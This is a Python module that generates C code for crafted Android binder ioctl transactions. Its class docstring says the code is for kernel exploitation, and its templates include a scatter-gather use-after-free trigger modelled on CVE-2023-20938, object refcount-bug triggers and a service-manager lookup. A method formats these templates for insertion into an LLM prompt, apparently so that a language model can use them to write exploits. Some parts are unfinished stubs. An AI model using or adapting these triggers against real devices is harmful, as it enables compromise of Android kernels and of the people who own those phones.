"""
android.binder_fuzzer — Binder transaction C code generator.

Generates C code for sending crafted binder transactions to Android
services. Useful for triggering binder-related kernel vulnerabilities
from userspace (e.g. CVE-2023-20938, CVE-2019-2215).

The generated code uses raw ioctl() against /dev/binder rather than
going through libbinder, allowing precise control over transaction
parameters and parcel contents.
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional


# ═════════════════════════════════════════════════════════════════════
# Binder transaction templates
# ═════════════════════════════════════════════════════════════════════

_BINDER_HEADER = r"""
/* ── Binder raw ioctl definitions ──────────────────────────────── */
/* These avoid depending on Android's libbinder                    */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <linux/android/binder.h>
#include <errno.h>

#define BINDER_DEV "/dev/binder"
#define BINDER_VM_SIZE (1 * 1024 * 1024)

static int binder_fd = -1;
static void *binder_mapped = NULL;

static int binder_open(void) {
    binder_fd = open(BINDER_DEV, O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) {
        perror("open " BINDER_DEV);
        return -1;
    }

    binder_mapped = mmap(NULL, BINDER_VM_SIZE,
                         PROT_READ, MAP_PRIVATE, binder_fd, 0);
    if (binder_mapped == MAP_FAILED) {
        perror("mmap binder");
        close(binder_fd);
        binder_fd = -1;
        return -1;
    }

    /* Set max threads */
    uint32_t max_threads = 0;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);

    /* Enter looper */
    ioctl(binder_fd, BC_ENTER_LOOPER, NULL);

    return 0;
}

static void binder_close(void) {
    if (binder_mapped && binder_mapped != MAP_FAILED) {
        munmap(binder_mapped, BINDER_VM_SIZE);
    }
    if (binder_fd >= 0) {
        close(binder_fd);
    }
}
"""

_BINDER_TEMPLATES: Dict[str, Dict[str, Any]] = {
    "basic_transaction": {
        "description": (
            "Send a basic binder transaction to a service handle. "
            "Suitable for triggering transaction-based vulnerabilities."
        ),
        "code": r"""
/* ── Basic binder transaction ──────────────────────────────────── */
/* Sends a single transaction with controlled parcel data          */

%(binder_header)s

static int binder_send_transaction(
    uint32_t target_handle,
    uint32_t code,
    const void *data,
    size_t data_size,
    const void *offsets,
    size_t offsets_size
) {
    struct binder_transaction_data txn = {0};
    txn.target.handle = target_handle;
    txn.code = code;
    txn.flags = TF_ACCEPT_FDS;
    txn.data.ptr.buffer = (binder_uintptr_t)data;
    txn.data.ptr.offsets = (binder_uintptr_t)offsets;
    txn.data_size = data_size;
    txn.offsets_size = offsets_size;

    struct {
        uint32_t cmd;
        struct binder_transaction_data txn;
    } writebuf;

    writebuf.cmd = BC_TRANSACTION;
    writebuf.txn = txn;

    struct binder_write_read bwr = {0};
    bwr.write_buffer = (binder_uintptr_t)&writebuf;
    bwr.write_size = sizeof(writebuf);

    /* Read buffer for reply */
    char readbuf[256];
    bwr.read_buffer = (binder_uintptr_t)readbuf;
    bwr.read_size = sizeof(readbuf);

    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    if (ret < 0) {
        perror("BINDER_WRITE_READ");
        return -1;
    }

    printf("[binder] transaction sent: handle=%u code=%u data_size=%zu\n",
           target_handle, code, data_size);
    return 0;
}

int main(void) {
    if (binder_open() < 0) return 1;

    /* TODO: Set target handle and transaction code */
    uint32_t handle = 0;  /* Service manager = 0 */
    uint32_t code = 1;    /* Transaction code */

    /* Build parcel data */
    char parcel_data[256] = {0};
    /* TODO: Fill parcel_data with crafted payload */
    size_t parcel_size = 64;

    binder_send_transaction(handle, code, parcel_data, parcel_size, NULL, 0);

    binder_close();
    return 0;
}
""",
    },
    "flat_binder_object": {
        "description": (
            "Send a transaction containing flat_binder_object entries. "
            "Used to trigger object reference counting bugs in the "
            "binder driver (UAF via BC_FREE_BUFFER etc.)."
        ),
        "code": r"""
/* ── Binder transaction with flat_binder_object ────────────────── */
/* Triggers object refcount handling in the binder driver          */
/* Pattern: embed binder objects in transaction data to exercise   */
/* the driver's object tracking and reference counting code        */

%(binder_header)s

static int send_with_binder_objects(
    uint32_t target_handle,
    uint32_t code,
    int num_objects
) {
    /* Build parcel with embedded flat_binder_objects */
    size_t data_size = 256 + num_objects * sizeof(struct flat_binder_object);
    char *data = calloc(1, data_size);
    if (!data) return -1;

    /* Write interface token (Android convention) */
    /* 4 bytes strictMode + 4 bytes string length + utf16 string */

    /* Embed flat_binder_objects */
    binder_size_t *offsets = calloc(num_objects, sizeof(binder_size_t));
    size_t offset = 128; /* after parcel header */

    for (int i = 0; i < num_objects; i++) {
        struct flat_binder_object *obj =
            (struct flat_binder_object *)(data + offset);

        obj->hdr.type = BINDER_TYPE_BINDER;
        obj->flags = 0x7f | FLAT_BINDER_FLAG_ACCEPTS_FDS;
        obj->binder = (binder_uintptr_t)0; /* local binder object */
        obj->cookie = (binder_uintptr_t)(0x41414141 + i);

        offsets[i] = offset;
        offset += sizeof(struct flat_binder_object);
    }

    struct binder_transaction_data txn = {0};
    txn.target.handle = target_handle;
    txn.code = code;
    txn.flags = TF_ACCEPT_FDS;
    txn.data.ptr.buffer = (binder_uintptr_t)data;
    txn.data.ptr.offsets = (binder_uintptr_t)offsets;
    txn.data_size = offset;
    txn.offsets_size = num_objects * sizeof(binder_size_t);

    struct {
        uint32_t cmd;
        struct binder_transaction_data txn;
    } writebuf;
    writebuf.cmd = BC_TRANSACTION;
    writebuf.txn = txn;

    struct binder_write_read bwr = {0};
    bwr.write_buffer = (binder_uintptr_t)&writebuf;
    bwr.write_size = sizeof(writebuf);

    char readbuf[256];
    bwr.read_buffer = (binder_uintptr_t)readbuf;
    bwr.read_size = sizeof(readbuf);

    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    printf("[binder] sent %d objects, ret=%d\n", num_objects, ret);

    free(data);
    free(offsets);
    return ret;
}

int main(void) {
    if (binder_open() < 0) return 1;

    /* Send transactions with increasing numbers of binder objects */
    for (int n = 1; n <= 8; n++) {
        send_with_binder_objects(0, 1, n);
        usleep(10000);
    }

    binder_close();
    return 0;
}
""",
    },
    "scatter_gather_uaf": {
        "description": (
            "Trigger binder scatter-gather UAF (CVE-2023-20938 pattern). "
            "Uses SG transactions with crafted buffer/offset patterns "
            "to cause use-after-free in binder_transaction_buffer_release."
        ),
        "code": r"""
/* ── Binder scatter-gather UAF trigger ─────────────────────────── */
/* Pattern from CVE-2023-20938: Use scatter-gather transactions     */
/* to trigger UAF in binder buffer cleanup path                    */

%(binder_header)s

/* Scatter-gather buffer description */
struct binder_buffer_object {
    struct binder_object_header hdr;
    uint32_t flags;
    binder_uintptr_t buffer;
    binder_size_t length;
    binder_size_t parent;
    binder_size_t parent_offset;
};

static int send_sg_transaction(
    uint32_t target_handle,
    uint32_t code,
    int trigger_uaf
) {
    /*
     * Build a transaction with scatter-gather buffers that
     * reference each other. When the transaction fails or is
     * freed, the cleanup path processes buffers in order,
     * potentially freeing a buffer still referenced by a
     * later entry.
     */

    size_t data_size = 1024;
    char *data = calloc(1, data_size);
    if (!data) return -1;

    /* Allocate space for buffer objects and their offsets */
    int num_bufs = trigger_uaf ? 3 : 1;
    binder_size_t *offsets = calloc(num_bufs, sizeof(binder_size_t));

    size_t offset = 64; /* after parcel header area */

    /* Buffer 0: parent buffer */
    struct binder_buffer_object *parent_buf =
        (struct binder_buffer_object *)(data + offset);
    parent_buf->hdr.type = BINDER_TYPE_PTR;
    parent_buf->flags = 0;
    /* Point to some user-space buffer with payload data */
    char payload[256] = "AAAA";
    parent_buf->buffer = (binder_uintptr_t)payload;
    parent_buf->length = sizeof(payload);
    parent_buf->parent = 0;
    parent_buf->parent_offset = 0;
    offsets[0] = offset;
    offset += sizeof(struct binder_buffer_object);

    if (trigger_uaf) {
        /* Buffer 1: child that references parent */
        struct binder_buffer_object *child1 =
            (struct binder_buffer_object *)(data + offset);
        child1->hdr.type = BINDER_TYPE_PTR;
        child1->flags = 1; /* HAS_PARENT */
        child1->buffer = (binder_uintptr_t)payload;
        child1->length = 64;
        child1->parent = 0;       /* offset index of parent */
        child1->parent_offset = 0; /* offset within parent's buffer */
        offsets[1] = offset;
        offset += sizeof(struct binder_buffer_object);

        /* Buffer 2: another child with crafted parent_offset */
        struct binder_buffer_object *child2 =
            (struct binder_buffer_object *)(data + offset);
        child2->hdr.type = BINDER_TYPE_PTR;
        child2->flags = 1;
        child2->buffer = (binder_uintptr_t)payload;
        child2->length = 64;
        child2->parent = 0;
        /* Crafted offset to overlap with freed region */
        child2->parent_offset = 128;
        offsets[2] = offset;
        offset += sizeof(struct binder_buffer_object);
    }

    struct binder_transaction_data txn = {0};
    txn.target.handle = target_handle;
    txn.code = code;
    txn.flags = TF_ACCEPT_FDS;
    txn.data.ptr.buffer = (binder_uintptr_t)data;
    txn.data.ptr.offsets = (binder_uintptr_t)offsets;
    txn.data_size = offset;
    txn.offsets_size = num_bufs * sizeof(binder_size_t);

    struct {
        uint32_t cmd;
        struct binder_transaction_data txn;
    } writebuf;
    writebuf.cmd = BC_TRANSACTION;
    writebuf.txn = txn;

    struct binder_write_read bwr = {0};
    bwr.write_buffer = (binder_uintptr_t)&writebuf;
    bwr.write_size = sizeof(writebuf);

    char readbuf[256];
    bwr.read_buffer = (binder_uintptr_t)readbuf;
    bwr.read_size = sizeof(readbuf);

    printf("[binder] sending SG transaction: %d buffers, uaf=%d\n",
           num_bufs, trigger_uaf);

    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    if (ret < 0) {
        perror("SG transaction");
    }

    free(data);
    free(offsets);
    return ret;
}

int main(void) {
    if (binder_open() < 0) return 1;

    /* Send normal SG transaction first */
    send_sg_transaction(0, 1, 0);
    usleep(50000);

    /* Send crafted SG transaction to trigger UAF */
    send_sg_transaction(0, 1, 1);

    binder_close();
    return 0;
}
""",
    },
    "service_manager_lookup": {
        "description": (
            "Look up a service handle via the Android Service Manager "
            "(handle 0). Required before sending transactions to a "
            "specific service."
        ),
        "code": r"""
/* ── Binder service manager lookup ─────────────────────────────── */
/* Query handle 0 (servicemanager) to get handle for a named svc   */

%(binder_header)s

/* Service manager transaction codes */
#define SVC_MGR_GET_SERVICE   1
#define SVC_MGR_CHECK_SERVICE 2
#define SVC_MGR_ADD_SERVICE   3
#define SVC_MGR_LIST_SERVICES 4

static uint32_t lookup_service(const char *name) {
    /*
     * Service manager parcel format:
     *   strict_mode_policy (int32)
     *   interface descriptor (string16: "android.os.IServiceManager")
     *   service name (string16)
     */

    size_t name_len = strlen(name);
    size_t data_size = 512;
    char *data = calloc(1, data_size);
    if (!data) return (uint32_t)-1;

    char *p = data;

    /* Strict mode */
    *(int32_t *)p = 0;
    p += 4;

    /* Interface token: "android.os.IServiceManager" */
    const char *iface = "android.os.IServiceManager";
    int32_t iface_len = strlen(iface);
    *(int32_t *)p = iface_len;
    p += 4;
    /* Write as UTF-16LE */
    for (int i = 0; i < iface_len; i++) {
        *(uint16_t *)p = (uint16_t)iface[i];
        p += 2;
    }
    *(uint16_t *)p = 0; /* null terminator */
    p += 2;
    /* Align to 4 bytes */
    while ((uintptr_t)p % 4) p++;

    /* Service name */
    *(int32_t *)p = (int32_t)name_len;
    p += 4;
    for (size_t i = 0; i < name_len; i++) {
        *(uint16_t *)p = (uint16_t)name[i];
        p += 2;
    }
    *(uint16_t *)p = 0;
    p += 2;
    while ((uintptr_t)p % 4) p++;

    size_t actual_size = p - data;

    struct binder_transaction_data txn = {0};
    txn.target.handle = 0; /* service manager */
    txn.code = SVC_MGR_CHECK_SERVICE;
    txn.flags = 0;
    txn.data.ptr.buffer = (binder_uintptr_t)data;
    txn.data.ptr.offsets = 0;
    txn.data_size = actual_size;
    txn.offsets_size = 0;

    struct {
        uint32_t cmd;
        struct binder_transaction_data txn;
    } writebuf;
    writebuf.cmd = BC_TRANSACTION;
    writebuf.txn = txn;

    struct binder_write_read bwr = {0};
    bwr.write_buffer = (binder_uintptr_t)&writebuf;
    bwr.write_size = sizeof(writebuf);

    char readbuf[1024];
    bwr.read_buffer = (binder_uintptr_t)readbuf;
    bwr.read_size = sizeof(readbuf);

    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    free(data);

    if (ret < 0) {
        printf("[svcmgr] lookup '%s' failed: %s\n", name, strerror(errno));
        return (uint32_t)-1;
    }

    /* Parse reply to extract handle */
    /* Reply format: BR_REPLY + binder_transaction_data with handle */
    char *rp = readbuf;
    while (rp < readbuf + bwr.read_consumed) {
        uint32_t cmd = *(uint32_t *)rp;
        rp += 4;
        if (cmd == BR_REPLY) {
            struct binder_transaction_data *reply =
                (struct binder_transaction_data *)rp;
            printf("[svcmgr] got reply for '%s'\n", name);
            /* The handle would be in the reply's buffer data */
            /* For real implementation, parse the flat_binder_object */
            return 0; /* TODO: extract actual handle */
        }
        rp += sizeof(struct binder_transaction_data);
    }

    printf("[svcmgr] no reply for '%s'\n", name);
    return (uint32_t)-1;
}

int main(void) {
    if (binder_open() < 0) return 1;

    /* Look up common services */
    const char *services[] = {
        "activity",
        "SurfaceFlinger",
        "media.player",
        NULL,
    };

    for (int i = 0; services[i]; i++) {
        uint32_t handle = lookup_service(services[i]);
        printf("  %s -> handle %u\n", services[i], handle);
    }

    binder_close();
    return 0;
}
""",
    },
}


class BinderFuzzer:
    """Generate binder transaction C code for kernel exploitation."""

    def __init__(self) -> None:
        self._templates = _BINDER_TEMPLATES
        self._header = _BINDER_HEADER

    def get(self, name: str) -> Optional[Dict[str, Any]]:
        """Get a template by name."""
        return self._templates.get(name)

    def get_code(self, name: str) -> Optional[str]:
        """Get rendered C code for a template (with header inserted)."""
        t = self._templates.get(name)
        if not t:
            return None
        code = t["code"]
        # Insert binder header
        code = code.replace("%(binder_header)s", self._header)
        return code

    def list_all(self) -> List[str]:
        """List all available template names."""
        return list(self._templates.keys())

    def recommend_for_cve(self, cve_id: str) -> List[str]:
        """Recommend templates based on CVE characteristics."""
        cve_lower = cve_id.lower()
        results = []
        # CVE-2023-20938 is the scatter-gather UAF
        if "2023-20938" in cve_lower or "2023-21255" in cve_lower:
            results.append("scatter_gather_uaf")
        # CVE-2019-2215 is waitqueue UAF via ioctl
        if "2019-2215" in cve_lower:
            results.append("basic_transaction")
        # Default: always suggest service lookup + basic
        if "service_manager_lookup" not in results:
            results.append("service_manager_lookup")
        if "basic_transaction" not in results:
            results.append("basic_transaction")
        return results

    def format_for_prompt(self, names: Optional[List[str]] = None) -> str:
        """Format templates for inclusion in an LLM prompt."""
        targets = names or list(self._templates.keys())
        parts = [
            "# Binder Transaction Templates",
            "Use raw ioctl() against /dev/binder for precise control.",
            "",
        ]
        for name in targets:
            t = self._templates.get(name)
            if not t:
                continue
            parts.append(
                f"## {name}\n"
                f"Description: {t['description']}\n"
                f"```c\n{t['code'].strip()}\n```"
            )
        return "\n\n".join(parts)
